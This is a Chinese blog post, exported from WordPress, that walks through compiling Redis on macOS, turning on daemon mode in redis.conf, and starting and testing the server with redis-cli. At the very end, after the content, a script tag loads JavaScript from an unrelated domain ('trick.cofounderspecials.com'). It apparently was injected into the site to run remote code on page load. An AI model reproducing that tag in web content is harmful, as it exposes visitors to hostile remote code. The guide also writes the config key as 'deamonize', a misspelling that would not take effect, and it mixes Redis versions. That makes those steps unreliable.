---
layout: post
title: Mac 安装redis
date: 2019-12-27 17:47:17.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Linux
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2019/12/27/mac-%e5%ae%89%e8%a3%85redis/"
---
<div>
<p>在redis官网下载</p>
<p><a href="https://link.jianshu.com?t=https://redis.io/download" target="_blank" rel="nofollow noopener">https://redis.io/download</a></p>
<h2>1. 下载</h2>
<p>在redis官网下载</p>
<p><a href="https://link.jianshu.com?t=https://redis.io/download" target="_blank" rel="nofollow noopener">https://redis.io/download</a></p>
<p>把<code>Downloads</code> 文件夹中下载的 <code>redis-5.0.7</code> 文件夹拷贝到<code>/usr/local/下</code>。</p>
<h2>2. 编译和安装</h2>
<h3>1》在Terminal安装</h3>
<p>在命令行：</p>
<pre class="line-numbers  language-python"><code class="python  language-python">$ cd redis<span class="token operator">-5.0.7</span>
$ make
$ sudo make install </code></pre>
<h3>2》在bin下可执行的程序</h3>
<ul>
<li>redis-server: Redis服务器</li>
<li>redis-cli: 命令行客户端</li>
<li>redis-benchmark: Redis的性能测试工具</li>
<li>redis-check-aof: AOF文件修复工具</li>
<li>redis-check-dump: RDB文件检测工具</li>
<li>redis.conf: Redis的配置文件</li>
</ul>
<p>将配置文件redis.conf中的deamonize yes 以守护进程的方式启动。</p>
<p>在命令行的目录 <code>/usr/local/redis-5.0.7</code> 中：</p>
<pre class="line-numbers  language-css"><code class="  language-css">vim redis.conf
</code></pre>
<p>在</p>
<pre class="line-numbers  language-python"><code class="python  language-python"><span class="token comment">################################# GENERAL #####################################</span>
</code></pre>
<p>下面几行，有一行是</p>
<pre class="line-numbers  language-python"><code class="python  language-python">daemonize no
</code></pre>
<p>这是守护进程的开关，改为 yes</p>
<pre class="line-numbers  language-python"><code class="python  language-python">deamonize yes
</code></pre>
<p>进入<code>/usr/local/bin</code>目录下。</p>
<p>输入命令即可开启redis服务。</p>
<pre class="line-numbers  language-python"><code class="python  language-python">redis<span class="token operator">-</span>server
</code></pre>
<p>服务开启显示：</p>
<pre class="line-numbers  language-python"><code class="python  language-python">Running <span class="token keyword">in</span> standalone mode
Port<span class="token punctuation">:</span> <span class="token number">6379</span>
PID<span class="token punctuation">:</span> <span class="token number">32211</span>
</code></pre>
<p>再打开一个客户端，进入<code>/usr/local/bin/</code>，开启服务端<strong>redis-cli</strong>。</p>
<p>测试服务器和客户端都开启了。</p>
<pre class="line-numbers  language-python"><code class="python  language-python"><span class="token operator">/</span>Users<span class="token operator">/</span>macroot <span class="token punctuation">[</span>macroot@macroots<span class="token operator">-</span>MacBook<span class="token operator">-</span>Pro<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">]</span>
<span class="token operator">&gt;</span> cd <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span>

<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span> <span class="token punctuation">[</span>macroot@macroots<span class="token operator">-</span>MacBook<span class="token operator">-</span>Pro<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">]</span>
<span class="token operator">&gt;</span> redis<span class="token operator">-</span>cli
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> ping
PONG
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> echo <span class="token string">'king'</span>
<span class="token string">"king"</span>
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> 
</code></pre>
<h3>3》启动和停止Redis</h3>
<p>启动：</p>
<ul>
<li>redis-server</li>
<li>redis-server /etc/redis.conf</li>
</ul>
<p>停止</p>
<ul>
<li>shutdown（在redis-3.2.8是<code>shutdown nosave/save</code>）</li>
</ul>
<p>直接启动 <code>redis-server</code>。</p>
<p>把<code>/usr/local/redis-3.2.8</code>目录下的<code>redis.conf</code>拷贝到<code>/etc/</code>目录下</p>
<p>启动服务器</p>
<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i class="anticon anticon-copy" aria-label="icon: copy"></i></button></p>
<pre class="line-numbers  language-python"><code class="python  language-python"><span class="token operator">/</span>Users<span class="token operator">/</span>macroot <span class="token punctuation">[</span>macroot@macroots<span class="token operator">-</span>MacBook<span class="token operator">-</span>Pro<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">]</span>
<span class="token operator">&gt;</span> cd <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span>

<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span> <span class="token punctuation">[</span>macroot@macroots<span class="token operator">-</span>MacBook<span class="token operator">-</span>Pro<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">]</span>
<span class="token operator">&gt;</span> redis<span class="token operator">-</span>server <span class="token operator">/</span>etc<span class="token operator">/</span>redis<span class="token punctuation">.</span>conf
</code></pre>
</div>
<p>在客户端测试</p>
<pre class="line-numbers  language-python"><code class="python  language-python"><span class="token operator">/</span>Users<span class="token operator">/</span>macroot <span class="token punctuation">[</span>macroot@macroots<span class="token operator">-</span>MacBook<span class="token operator">-</span>Pro<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">]</span>
<span class="token operator">&gt;</span> redis<span class="token operator">-</span>cli
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> PONG
<span class="token punctuation">(</span>error<span class="token punctuation">)</span> ERR unknown command <span class="token string">'PONG'</span>
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> echo <span class="token string">"king"</span>
<span class="token string">"king"</span>
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> ping
PONG
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> </code></pre>
</div>
<p>&nbsp;<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
